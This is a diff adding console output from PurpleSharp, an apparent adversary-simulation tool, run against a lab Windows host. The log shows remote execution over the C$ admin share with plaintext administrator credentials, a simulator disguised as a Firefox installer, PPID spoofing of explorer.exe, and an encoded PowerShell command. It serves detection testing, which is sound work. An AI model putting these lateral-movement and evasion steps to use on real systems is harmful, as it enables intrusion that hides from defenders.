@@ -1,0 +1,45 @@
+c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug>PurpleSharp.exe /rhost win10-victim /ruser Administrator /rpwd DCPassw0rd! /d hrzwtk.local /t T1059.001 /v
+[+] Uploading and executing the Scout on \\win10-victim\C$\Windows\Temp\Scout.exe
+[+] Connecting to the Scout ...
+[+] OK
+[!] Recon -> Identified logged user: HRZWTK\domainuser
+[+] Uploading Simulator to \\win10-victim\C$\Users\domainuser\Downloads\Firefox_Installer.exe
+[+] Triggering simulation using PPID Spoofing | Process: explorer.exe | PID: 4168 | High Integrity: False
+[+] Grabbing the Scout output...
+[+] Results:
+
+11/15/2020 15:57:25 [*]  Starting scout namedpipe service with PID:480
+11/15/2020 15:57:25 [*]  Received from client: SYN
+11/15/2020 15:57:25 [*]  Received from client: recon:regular
+11/15/2020 15:57:26 [*]  Recon identified HRZWTK\domainuser logged in. Process to Spoof: explorer PID: 4168
+11/15/2020 15:57:26 [*]  Received from client: simrpath:Downloads\Firefox_Installer.exe
+11/15/2020 15:57:26 [*]  Received from client: technique:T1059.001
+11/15/2020 15:57:26 [*]  Received from client: variation:1
+11/15/2020 15:57:26 [*]  Received from client: opsec:ppid
+11/15/2020 15:57:26 [*]  Received from client: pbsleep:0
+11/15/2020 15:57:26 [*]  Received from client: tsleep:0
+11/15/2020 15:57:26 [*]  Received from client: cleanup:True
+11/15/2020 15:57:26 [*]  Received from client: act
+11/15/2020 15:57:26 [*]  Received act!
+11/15/2020 15:57:26 [*]  Using Parent Process Spoofing technique for Opsec
+11/15/2020 15:57:26 [*]  Spoofing explorer PID: 4168
+11/15/2020 15:57:26 [*]  Executing: C:\Users\domainuser\Downloads\Firefox_Installer.exe /n
+11/15/2020 15:57:29 [*]  Sending payload to Scout Aggent through namedpipe: technique:T1059.001 pbsleep:0 tsleep:0 cleanup:True
+11/15/2020 15:57:31 [*]  Received from client: quit
+11/15/2020 15:57:31 [*]  Received quit! Exitting namedpipe
+[+] Results:
+
+11/15/2020 15:57:29 [*]  Starting T1059.001 Simulation on WIN10-VICTIM
+11/15/2020 15:57:29 [*]  Simulator running from C:\Users\domainuser\Downloads\Firefox_Installer.exe with PID:1920 as HRZWTK\domainuser
+11/15/2020 15:57:29 [*]  Using the command line to execute the technique
+11/15/2020 15:57:29 [*]  Executing Command: powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==
+11/15/2020 15:57:29 [*]  Process successfully created. (PID): 6500
+11/15/2020 15:57:29 [*]  Simulation Finished
+11/15/2020 15:57:29 [*]  Playbook Finished
+
+[+] Cleaning up...
+[+] Deleting \\win10-victim\C$\Windows\Temp\Scout.exe
+[+] Deleting \\win10-victim\C$\Windows\Temp\0001.dat
+[+] Deleting \\win10-victim\C$\Users\domainuser\Downloads\Firefox_Installer.exe
+[+] Deleting \\win10-victim\C$\Users\domainuser\Downloads\0001.dat
+
